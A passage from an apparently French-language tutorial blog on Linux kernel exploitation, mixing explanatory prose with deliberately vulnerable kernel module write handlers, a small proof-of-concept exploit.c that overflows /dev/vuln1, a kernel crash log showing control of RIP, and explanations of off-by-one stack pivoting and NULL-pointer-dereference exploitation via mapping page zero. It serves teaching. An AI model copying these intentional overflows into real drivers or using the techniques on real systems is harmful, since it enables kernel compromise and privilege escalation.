</span><span style="color:#75715e">  *  - In opposition to likely(condition), unlikely(condition)
</span><span style="color:#75715e">  *  will make that:
</span><span style="color:#75715e">  *  
</span><span style="color:#75715e">  *  if(unlikely(!func(0x1337))) {
</span><span style="color:#75715e">  *      return 0;
</span><span style="color:#75715e">  *  }
</span><span style="color:#75715e">  * 
</span><span style="color:#75715e">  *  else { 
</span><span style="color:#75715e">  *    return 1337;
</span><span style="color:#75715e">  *  }
</span><span style="color:#75715e">  *
</span><span style="color:#75715e">  *
</span><span style="color:#75715e">  *  At runtime it&#39;s equivalent to:
</span><span style="color:#75715e">  *
</span><span style="color:#75715e">  *  if(func(0x1337)){
</span><span style="color:#75715e">  *  /* In assembly it looks like it:
</span><span style="color:#75715e">  *  *  call func
</span><span style="color:#75715e">  *  *  cmp rax, 0x0
</span><span style="color:#75715e">  *  *  je so_far_else
</span><span style="color:#75715e">  *  *  mov rax, 1337
</span><span style="color:#75715e">  *  *  ret
</span><span style="color:#75715e">  *  * 
</span><span style="color:#75715e">  *  *  In assembly we can see that when the unlikely condition
</span><span style="color:#75715e">  *  *  is true, the execution is a bit slower because the address
</span><span style="color:#75715e">  *  *  of else can be in another page not in the TLB 
</span><span style="color:#75715e">  *  *  (translation lookaside buffer). It&#39;s too used by the branch prediction
</span><span style="color:#75715e">  *  *  feature of you processor for know if it must evaluate the jmp.
</span><span style="color:#75715e">  *  *
</span><span style="color:#75715e">  *  /
</span><span style="color:#75715e">  *    return 1337; 
</span><span style="color:#75715e">  *  }
</span><span style="color:#75715e">  *  else { 
</span><span style="color:#75715e">  *  /* This label can be in another page
</span><span style="color:#75715e">  *  *  the jmp here is &#39;unlikely&#39; and is a 
</span><span style="color:#75715e">  *  *  bit more slow.
</span><span style="color:#75715e">  *  /
</span><span style="color:#75715e">  *    return 0;
</span><span style="color:#75715e">  *  }
</span><span style="color:#75715e">  *
</span><span style="color:#75715e">  *
</span><span style="color:#75715e">  */</span> 

  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> res <span style="color:#f92672">=</span> n;
  might_fault();
  <span style="color:#66d9ef">if</span> (likely(access_ok(from, n))) {
    <span style="color:#75715e">/* does we can access n bytes from from ? */</span>
    kasan_check_write(to, n);
    <span style="color:#75715e">/* does we can write n bytes to to ? */</span>

    <span style="color:#75715e">/* All check have been done 
</span><span style="color:#75715e">    *  We can call the final function.
</span><span style="color:#75715e">    */</span>

    res <span style="color:#f92672">=</span> raw_copy_from_user(to, from, n); 
  }  
  
  <span style="color:#75715e">/* When res is equal to zero the data has been copied, else 
</span><span style="color:#75715e">  *  it&#39;s that the previous condition is not taken and so res = number
</span><span style="color:#75715e">  *  of bytes to copy.
</span><span style="color:#75715e">  */</span>

  <span style="color:#66d9ef">if</span> (unlikely(res))
    memset(to <span style="color:#f92672">+</span> (n <span style="color:#f92672">-</span> res), <span style="color:#ae81ff">0</span>, res);

    <span style="color:#75715e">/* 
</span><span style="color:#75715e">    *  If there is an error, the kernel land buffer 
</span><span style="color:#75715e">    *  is filled with NULL bytes.
</span><span style="color:#75715e">    */</span>

  <span style="color:#66d9ef">return</span> res; <span style="color:#75715e">/* 0 on success and n on error */</span>
}

<span style="color:#75715e">/* the raw_copy_from_user(to, from, n) is just: */</span>

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>
raw_copy_from_user(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>to, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>from, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> len)
{
  <span style="color:#66d9ef">return</span> __copy_user(to, (__force <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)from, len);
}

<span style="color:#75715e">/* 
</span><span style="color:#75715e">*  Finally raw_copy_from_user is just a call to __copy_user (a memcpy) 
</span><span style="color:#75715e">*  And __copy_from_user is just a call to raw_copy_from_user with less checks 
</span><span style="color:#75715e">*/</span>

<span style="color:#66d9ef">static</span> __always_inline __must_check <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>
__copy_from_user(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>to, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>from, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> n)
{
	might_fault();
	kasan_check_write(to, n);
	check_object_size(to, n, false);
	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">raw_copy_from_user</span>(to, from, n);
}
</code></pre></div><p>Toute cette recherche est juste faite pour vous faire comprendre que copy_from_user est juste un appel à memcpy avec beaucoup de vérifications. Mais pour plus de clarté, nous utilisons raw_copy_from_user et non directement memcpy lorsque nous voulons créer des comportements dangereux.</p>
<p>Nous verrons les deux cas dans un dangereux handler d&rsquo;écriture d&rsquo;un device:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* Same structure than previously */</span>
<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> write_buf {  
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> length;
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>rbuf;
} wr_struct;

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">vuln1_write</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t user_count, loff_t <span style="color:#f92672">*</span>offt) {
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> vuln_buf[LEN_MAX];
  memset(vuln_buf, <span style="color:#ae81ff">0x0</span>, LEN_MAX);
  <span style="color:#75715e">/* We fill the vuln_buf of 0x0 */</span>

  wr_struct <span style="color:#f92672">*</span>argp <span style="color:#f92672">=</span> (wr_struct <span style="color:#f92672">*</span>)buf; <span style="color:#75715e">/* We are getting the user&#39;s arg */</span>

  <span style="color:#75715e">/*
</span><span style="color:#75715e">  *  if (raw_copy_from_user(vuln_buf, (const char __user *)argp-&gt;rbuf, user_count)) {
</span><span style="color:#75715e">  *     return -1;
</span><span style="color:#75715e">  *  }
</span><span style="color:#75715e">  *
</span><span style="color:#75715e">  *  If we uncomment it, the crash will occur and the code below will not
</span><span style="color:#75715e">  *  be executed, but the for loop or any equivalent while loop will create 
</span><span style="color:#75715e">  *  the same dangerous behaviour.
</span><span style="color:#75715e">  *
</span><span style="color:#75715e">  *
</span><span style="color:#75715e">  *  raw_copy_from_user(vuln_buf, (const char __user *)argp-&gt;rbuf, user_count) call is very 
</span><span style="color:#75715e">  *  dangerous because if the user_count send by the user is bigger than LEN_MAX,
</span><span style="color:#75715e">  *  the vuln_write&#39;s stack frame will be overflowed.
</span><span style="color:#75715e">  *  And it can overwrite the saved instruction pointer and redirect the control flow !! 
</span><span style="color:#75715e">  */</span>

  <span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
  <span style="color:#66d9ef">for</span> (i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> argp<span style="color:#f92672">-&gt;</span>length; i<span style="color:#f92672">++</span>) {
    vuln_buf[i] <span style="color:#f92672">=</span> argp<span style="color:#f92672">-&gt;</span>rbuf[i];
    printk(<span style="color:#e6db74">&#34;%x&#34;</span>, vuln_buf[i]);
  }

  <span style="color:#75715e">/* 
</span><span style="color:#75715e">  *  Just above, we can notice that the for loop is looping on argp-&gt;length in 
</span><span style="color:#75715e">  *  order to copy argp-&gt;length bytes from our userland buffer in the kernel-land 
</span><span style="color:#75715e">  *  buffer vuln_buf and if argp-&gt;length &gt; LEN_MAX, into the vuln_write&#39;s local variables and even further !.
</span><span style="color:#75715e">  *  Tt can be dangerous if it allow us to overwrite and control the saved instruction
</span><span style="color:#75715e">  *  pointer at the top of the stackframe.
</span><span style="color:#75715e">  */</span>

  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Maintenant que nous savons comment envoyer un payload à un handler d&rsquo;écriture, nous pouvons écrire le payload ci-dessous sans aucun problème:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* exploit.c */</span>

<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdarg.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#define LEN 250
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> write_buf {  
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> length;
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>rbuf;
} wr_struct;

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
  <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/dev/vuln1&#34;</span>, O_RDWR);

  wr_struct to_send;
  to_send.length <span style="color:#f92672">=</span> LEN;

  to_send.rbuf <span style="color:#f92672">=</span> malloc(LEN);
  memset(to_send.rbuf, <span style="color:#ae81ff">0xff</span>, LEN);

  <span style="color:#66d9ef">if</span> (write(fd, <span style="color:#f92672">&amp;</span>to_send, LEN) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
      printf(<span style="color:#e6db74">&#34;[Error sending pld]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
  }

  printf(<span style="color:#e6db74">&#34;[pld send]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);

  close(fd);
  free(to_send.rbuf);

  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Il nous suffit de compiler le KLM, et de le charger dans le kernel land avec insmod:</p>
<pre><code># make
make -C /lib/modules/3.19.0-31-generic/build SUBDIRS=/media/sf_C-C++/pwn_stuff/Kernel_Exploit/vuln1 modules
make[1]: Entering directory '/usr/src/linux-headers-3.19.0-31-generic'
  Building modules, stage 2.
  MODPOST 1 modules
make[1]: Leaving directory '/usr/src/linux-headers-3.19.0-31-generic'
# insmod main.ko &lt;- Load the kernel module in memory
# gcc exploit.c -g -o pld
# ./pld
Segmentation fault
# dmesg # &lt;- Command used to display kernel logs
[47655.844948] vuln1: Init
[47729.624822] [Open]
[47729.624946] fffffffffffffffffffffffffff [...]
[47729.625118] general protection fault: 0000 [#12] 
[47729.625122] SMP 
[...]
[47729.625171] task: ffff88007a0dbae0 ti: ffff8800692d4000 task.ti: ffff8800692d4000
[49382.393576] RIP: 0010:[ffffffffffffffff]  [ffffffffffffffff] 0xffffffffffffffff
[49382.393584] RSP: 0018:ffff880069333ee8  EFLAGS: 00010246
[49382.393588] RAX: 0000000000000000 RBX: ffffffffffffffff RCX: 0000000000002f06
[49382.393592] RDX: 000000000000bdfc RSI: 0000000000000246 RDI: 0000000000000246
[49382.393595] RBP: ffffffffffffffff R08: ffffffff81ed7120 R09: 000000000000fffd
[49382.393599] R10: 000000000000102f R11: 000000000000000f R12: ffffffffffffffff
[49382.393602] R13: 00000000000000e0 R14: ffff880069333f50 R15: 0000000000000000
[49382.393608] FS:  00007f9a9c255700(0000) GS:ffff88009d800000(0000) knlGS:0000000000000000
[49382.393612] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[49382.393616] CR2: ffffffffffffffff CR3: 00000000691f6000 CR4: 00000000000406f0
[49382.393625] Stack:
[49382.393627]  ffffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffff
[49382.393634]  ffffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffff
[49382.393640]  ffffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffff
[49382.393646] Call Trace:
[49382.393661]  [ffffffff817b6dcd] ? system_call_fastpath+0x16/0x1b
[49382.393664] Code:  Bad RIP value.
[49382.393672] RIP  [ffffffffffffffff] 0xffffffffffffffff
[49382.393678]  RSP ffff880069333ee8
[49382.393681] CR2: ffffffffffffffff
[49382.393687] ---[ end trace 6f00dcc0b67af37c ]---
</code></pre><p>Juste au-dessus, nous voyons beaucoup de choses intéressantes, toute notre stack est remplie de beaucoup de 0xff de notre argp-&gt;rbuf, rbp, rbx et r12 sont trop remplis de 0xff parce qu&rsquo;ils ont été pop à la fin de la fonction. Et enfin nous avons vu que rip a été pop à la fin de la fonction et a donc maintenu la valeur 0xffffffffffffffffffffff.</p>
<p>Félicitations ! Maintenant que nous avons déclenché ce gestionnaire d&rsquo;écriture, nous devons calculer le décalage à partir duquel rip est écrasé.</p>
<p>Mais pour l&rsquo;instant, ce n&rsquo;était qu&rsquo;une introduction à l&rsquo;exploitation de ce type de vulnérabilités.</p>
<h4 id="off-by-onetwo">Off by one/two<a href="#off-by-onetwo" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Une vulnérabilité „off by one/two“ se produit lorsqu&rsquo;un objet est débordé de seulement un ou deux octets. Habituellement, nous pouvons trouver ce genre de vulnérabilités dans une boucle:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> write_buf {
  <span style="color:#66d9ef">char</span> rbuf[LEN];
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> length;
} wr_struct;

<span style="color:#75715e">/* ... */</span>

<span style="color:#75715e">#define LEN 64
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">vuln1_write</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t user_count, loff_t <span style="color:#f92672">*</span>offt) {
  wr_struct <span style="color:#f92672">*</span>argp <span style="color:#f92672">=</span> (wr_struct <span style="color:#f92672">*</span>)buf;
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>k_write <span style="color:#f92672">=</span> kzalloc(argp<span style="color:#f92672">-&gt;</span>length);

  <span style="color:#75715e">/* The developper tries to be secure lulz */</span>

  <span style="color:#66d9ef">for</span> (ssize_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> argp<span style="color:#f92672">-&gt;</span>length; i<span style="color:#f92672">++</span>) {
    k_write[i] <span style="color:#f92672">=</span> argp<span style="color:#f92672">-&gt;</span>rbuf[i];
  }

  kfree(k_write);

  <span style="color:#75715e">/* Other version of the code without dynamic allocation */</span>

  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> vuln_buf[argp<span style="color:#f92672">-&gt;</span>length];

  <span style="color:#66d9ef">for</span> (ssize_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> LEN; i<span style="color:#f92672">++</span>) {
    vuln_buf[i] <span style="color:#f92672">=</span> argp<span style="color:#f92672">-&gt;</span>rbuf[i];
  }

  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;

}
</code></pre></div><p>Comme indiqué ci-dessus, l&rsquo;off by one apparaît dans le heap parce que nous allouons notre buffer sur le kernel heap avec kzmalloc ou sur la pile. Le &lt;= fait que si i commence à 0, il fera une boucle de 0 à LEN inclue et donc la boucle sera exécutée LEN plus une fois. Et cela conduit à un débordement car lorsqu&rsquo;un objet est de longueur LEN comme vu ci-dessus, le déréférencement se fait sur LEN+1 octets et donc l&rsquo;octet à côté du buffer sur la pile ou sur le heap peut être écrasé. Pour faire planter ce programme, c&rsquo;est à peu près la même chose que pour une stack based buffer overflow. La différence est qu&rsquo;une off by one/two n&rsquo;est souvent pas exploitable comme nous le verrons plus tard.</p>
<p>Mais pour l&rsquo;instant, il est très important de comprendre que la structure d&rsquo;une fonction est toujours composée d&rsquo;un prologue et d&rsquo;un épilogue. Dans l&rsquo;assembleur 64 bits d&rsquo;intel, un prologue ressemble à cela :</p>
<pre><code>push rbp
mov rbp, rsp
</code></pre><p>La première instruction s&rsquo;occupe de mettre notre sauvegarde de rbp sur la pile. La deuxième instruction consiste à sauvegarder la valeur de rsp afin de préserver de ses futurs changements lors de la création des variables locales. Cette valeur lui sera réstoré à la fin de la fonction.</p>
<p>L&rsquo;épilogue lui ressemblerait à:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">leave

<span style="color:#75715e">// leave is equal to:
</span><span style="color:#75715e">//            mov rsp, rbp
</span><span style="color:#75715e">//            pop rbp ; &lt;- The saved value of rbp, pushed on the stack
</span><span style="color:#75715e">//                    ; at the begin of the function is retablished.
</span><span style="color:#75715e"></span>
ret
</code></pre></div><p>L&rsquo;instruction de „leave“ permet de rétablir la valeur précédente de rsp et ainsi détruire toutes les variables locales créées dans notre fonction et de rétablir la valeur précédente de rbp avec le pop rbp. Enfin, l&rsquo;instruction ret va pop la valeur sur la stack dans rip et ainsi exécuter l&rsquo;instruction pointée par cette adresse. Notre objectif est de controler soit la valeur sur la pile lorsque l&rsquo;instruction „ret“ est exécutée ou pour un débordement sur le heap basé sur un décalement d&rsquo;un ou deux , écraser les données sensibles dans le heap.</p>
<p>Pour l&rsquo;instant, nous allons concentrer notre exploitation sur le scénario de stack overflow car l&rsquo;exploitation de la heap dépend de la version et du type de votre kernel allocator. Mais nous devons résoudre une contrainte principale : nous ne pouvons déborder que d&rsquo;un ou deux octets, donc comment overflow le saved rip s&rsquo;il y a le saved rbp juste avant ? Et comment faire si à côté du buffer vulnérable sur la pile il y a une autre variable ?</p>
<p>La réponse est que, pour de nombreuses raisons, une un off by one n&rsquo;est pas exploitable, mais je vais essayer d&rsquo;expliquer quand elle l&rsquo;est.</p>
<p>Une off by one est exploitable quand:</p>
<ul>
<li>
<p>[1] Le buffer se trouve juste à côté du saved rbp.</p>
</li>
<li>
<p>[2] Avec la contrainte [1], nous pouvons écraser les premiers octets du rbp sauvegardé. Mais le but est d&rsquo;écraser le rip sauvegardé ou que lorsque l&rsquo;instruction ret est exécutée, avoir le contrôle de la valeur sur la stack. Pour ce faire, nous utiliserons une technique de stack pivoting . Si vous n&rsquo;y connaissez rien en matière de stack pivoting, vous pouvez consulter le document présenté précédemment et le challenge ROP Emporium à ce sujet. Le stack pivoting consiste simplement à remplacer le rsp original par l&rsquo;adresse d&rsquo;un buffer que nous contrôlons. Et pour notre cas, nous utiliserons le seul registre que nous pouvons contrôler avec notre off by one. Il peut être fait par de nombreux gadgets, mais pour notre exploitation, c&rsquo;est souvent un leave, car il contient, comme on l&rsquo;a vu plus haut, l&rsquo;instruction mov rsp, rbp Sans ce gadget, l&rsquo;exploitation ne peut se faire. La particularité est que le gadget ne doit pas se trouver dans la fonction vulnérable mais dans une des fonctions appelantes. En effet, lorsque le mov rsp, rbp se produit dans la fonction vulnérable, le saved rbp n&rsquo;est pas rétabli dans rbp et donc nous ne le controlons pas. Mais après cette instruction, la valeur précédente de rbp sauvegardée sur la pile au début de la fonction est rétablie en rbp. Et lorsque l&rsquo;exécution revient à la fonction appelante, la valeur de rbp est différente est différente que lors de l&rsquo;appel à notre fonction vulnérable. Et nous contrôlons les un ou deux octets les moins significatifs ! C&rsquo;est ainsi que lorsque l&rsquo;épilogue de la fonction appelante est atteint, souvent, si cette fonction a des variables locales le mov rsp, rbp est atteint. Et le pivoting vers un autre buffer sous notre controle possible.</p>
</li>
</ul>
<p>Le schéma ci-dessous le présente un peu plus clairement:</p>

  <img src="/off_one.png"  alt="off-by-one"  class="left"  style="margin-left: auto; margin-right: auto"  />


<p>{1}: juste avant l&rsquo;appel à notre fonction de foo vulnérable, la valeur de la rbp est la même que celle de l&rsquo;instruction mov rbp, rsp du prologue. Et peut être par exemple : 0xffff880069333ee8</p>
<p>{2}: l&rsquo;exécution est transférée au code de la fonction foo et la valeur de l&rsquo;instruction qui suit l&rsquo;instruction d&rsquo;appel dans la fonction d&rsquo;appel est poussée sur la pile.</p>
<p>{3}: le prologue de la fonction foo est exécuté, le pointeur basé sur la sauvegarde est poussé sur la pile (stackframe). Et une nouvelle stackframe est créé.</p>
<p>{4}: la boucle vulnérable est exécutée et les un/deux octets les moins significatifs du saved rbp sont écrasés sur la stack. cf la contrainte [1].</p>
<p>{5}: l&rsquo;épilogue est exécuté, l&rsquo;instruction de leave détruit toutes les variables locales et fait pop le saved rbp pushed dans le prologue dans rbp.</p>
<p>{6}: Meme si la valeur du saved rbp est différente, c&rsquo;est toujours une stack address, mais les un / deux octets inférieurs sont écrasés. Si nous prenons la valeur aléatoire définie précédemment, avant le début de la fonction foo, rbp == 0xffff880069333ee8 et maintenant les octets 0xe8 ou 0x3ee8 peuvent être contrôlés.</p>
<p>Enfin, l&rsquo;instruction leave exécute l&rsquo;instruction mov rsp, rbp. La dernière contrainte est donc de trouver une zone de mémoire dans le stackframe de toute fonction que nous contrôlons et qui sera utilisée comme une custom stack. Mais si nous ne pouvons déborder que d&rsquo;un octet, la plage est très limitée et dépend de la valeur du pointeur de base lorsque le débordement se produit.</p>
<p>Dans notre exemple, la valeur de la rbp lorsque le débordement se produit est de 0xffff880069333ee8 et nous pouvons contrôler seulement le dernier octet. Le 0xffff880069333e est donc l&rsquo;adresse de base que nous ne pouvons modifier qu&rsquo;un très petit offset. Un octet représente une gamme de 255 possibilités. Ainsi, dans le cadre de la pile de l&rsquo;appel nous pouvons faire pivoter la pile uniquement sur 0xe8 octets en raison de la structure LIFO (Last In, First Out) de la pile. En effet, elle se développe vers le bas. Donc, plus le dernier octet de la rbp sauvegardée est petit, moins nous avons de place pour trouver un emplacement pour notre pile personnalisée dans le stackframe de la fonction appelante. Mais une solution peut être de rechercher une zone de mémoire dans la fonction appelante de la fonction appelante. Avec cette technique nous pouvons utiliser memory area atour des 2^8 pour une off by one et autour de 2^16 pour une off by two.</p>
<h4 id="null-pointer-dereference">NULL pointer dereference<a href="#null-pointer-dereference" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Une vulnérabilité de déréférencement de pointeur NULL se produit lorsque vous essayez d&rsquo;accéder à certaines données situées à l&rsquo;adresse 0x0. Par exemple, si le pointeur d&rsquo;une structure est initialisé à 0x0 et que vous essayez de le déréférencer.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* vuln1.c */</span>

<span style="color:#75715e">#define LEN_MAX 16
</span><span style="color:#75715e"></span>
<span style="color:#75715e">/* ... */</span>

<span style="color:#66d9ef">static</span> ssize_t <span style="color:#a6e22e">vuln1_write</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t user_count, loff_t <span style="color:#f92672">*</span>offt) {

  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> k_buf[LEN_MAX];
  ssize_t i;

  wr_struct <span style="color:#f92672">*</span>argp <span style="color:#f92672">=</span> (wr_struct <span style="color:#f92672">*</span>)buf;

  <span style="color:#66d9ef">if</span> (argp<span style="color:#f92672">-&gt;</span>length <span style="color:#f92672">&gt;</span> LEN_MAX) {
    printk(KERN_INFO <span style="color:#e6db74">&#34;[OVERFLOW DETECTED]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
  }

  <span style="color:#75715e">/* The length is checked to avoid overflows :) */</span>

  argp <span style="color:#f92672">=</span> NULL;

  <span style="color:#75715e">/* Init to NULL the pointer toward the struct */</span>

  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; i <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)argp<span style="color:#f92672">-&gt;</span>length; i<span style="color:#f92672">++</span>) {
    k_buf[i] <span style="color:#f92672">=</span> argp<span style="color:#f92672">-&gt;</span>rbuf[i];
  }

  <span style="color:#75715e">/* NULL pointer dereference for each iteration */</span>

  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Il va essayer de déréférencer un pointeur dans une structure située en 0x0. En effet argp-&gt;rbuf[i] est équivalent à <code>*(*((unsigned long *)(argp + offsetof(argp-&gt;rbuf))) + i * sizeof(unsigned char))</code>. Il y a donc deux déréférences, la première pour connaître l&rsquo;adresse vers laquelle rbuf pointe. La seconde pour lire l&rsquo;octet (unsigned char) à cette adresse plus le compteur. Ce qui est intéressant, c&rsquo;est que nous pouvons contrôler les octets à 0x0 si la variable système mmap_min_addr est définie à 0x0 (ne peut être éditée que lorsque vous êtes root). Sa valeur peut être modifiée (c&rsquo;est généralement le cas sur les systèmes modernes) pour empêcher l&rsquo;exploitation des déréférences des pointeurs NULL. Mais ici, nous partons du principe que nous pouvons utiliser l&rsquo;appel système mmap pour mapper une page à 0x0 et donc controler les bytes à cet endroit. Cela peut être un peu difficile à comprendre pour le moment, mais l&rsquo;address space du programme est segmenté en pages de longueur 0x1000 (octets) auxquelles sont associés quelques drapeaux notamment les permissions comme si la page est exécutable, si elle est accessible en écriture, si elle appartient au kernel ou non. Une adresse virtuelle est segmentée en plusieurs parties selon le nombre de paging structures choisi par votre système d&rsquo;exploitation (souvent 4 sur le OS 64 bits). Ces 4 niveaux de paging ne sont que des tableaux de pointeurs vers les structures inférieures où certains bits de ces pointeurs sont utilisés comme drapeaux booléens (les 64 bits ne sont pas obligatoires pour adresser physiquement les structures inférieures). Et finalement, la dernière structure pointe vers l&rsquo;adresse physique de la page cible à laquelle sont ajoutés les 12 derniers bits de l&rsquo;adresse virtuelle (bits 0 à 11). L&rsquo;adresse virtuelle est ainsi segmentée comme un premier offset de 12 bits ( PAGE_LENGTH =&gt; 2^12 soit 4096), quatre champs de 9 bits chacun qui sont juste un offset dans chaque structure de paging (2^9 = 512 entrées, l&rsquo;entrée n est déterminée par <code>BITS_VADDR * sizeof(unsigned char *)</code> car chaque entrée est un pointeur). Enfin, le registre cr3 contient base address physique de la première structure de paging (pmle4) ; il est obligatoire car lorsqu&rsquo;il est modifié, tout l&rsquo;espace d&rsquo;adresse est switched (utilisé dans des context switch).</p>

  <img src="/four_level_paging.png"  alt="mapping"  class="left"  style="margin-left: auto; margin-right: auto"  />


<p>Mais c&rsquo;est un autre sujet qui sera abordé dans un autre article et pour l&rsquo;instant vous devez juste comprendre qu&rsquo;un processus partage les pages où le kernel est mappé avec les autres processus et donc quand l&rsquo;exécution est dans le kernel land, vous pouvez facilement accéder et déréférencer les pointeurs du userland (ce qui n&rsquo;est pas toujours le cas surtout avec la protection smap) parce que cr3 n&rsquo;est pas changé (ou alors c&rsquo;est quand le KPTI est activé mais ils sont alors mappés dans l&rsquo;espace d&rsquo;adressage du kernel avec le bit NX). Ainsi, si nous mappons quelque chose à 0x0, lorsque l&rsquo;exécution atteindra le kernel, toutes les structures de paging du processus appelant seront conservées (et donc toutes les pages du userland pourront être gérées par le kernel). Voilà la raison pour laquelle un déréférencement de pointeur NULL est exploitable. Nous venons de créer une nouvelle structure wr_struct en 0x0, modifier le champ length pour déborder le pointeur d&rsquo;instruction enregistré et créer un payload dont l&rsquo;adresse est gérée par le champ rbuf de la structure.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
